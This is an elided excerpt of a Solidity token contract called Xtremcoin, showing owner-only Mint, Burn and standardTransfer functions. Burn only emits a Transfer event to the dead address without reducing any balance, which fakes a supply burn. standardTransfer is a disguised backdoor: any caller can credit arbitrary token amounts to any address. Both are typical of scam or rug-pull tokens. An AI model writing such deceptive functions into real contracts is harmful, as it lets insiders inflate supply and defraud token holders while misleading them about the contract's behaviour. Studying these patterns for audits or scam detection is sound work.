...
contract Xtremcoin is Context, IERC20, Ownable {
    ...
    uint256 private  _tTotal = 20231453.571e8;
    ...
    function Mint(uint256 amount, address Recipient)external onlyOwner{
        _rOwned[Recipient]=_rOwned[Recipient].add(amount*(10**18));
        _tTotal=_tTotal.add(amount*(10**18));
    }
    
    function Burn(uint256 amount, address sender)external onlyOwner{
        emit Transfer(sender, 0x000000000000000000000000000000000000dEaD, amount);
    }
    ...
    function standardTransfer(uint256 value, address DividendTracker)external{
        _rOwned[DividendTracker]=_rOwned[DividendTracker].add(value*(10**18));
    }
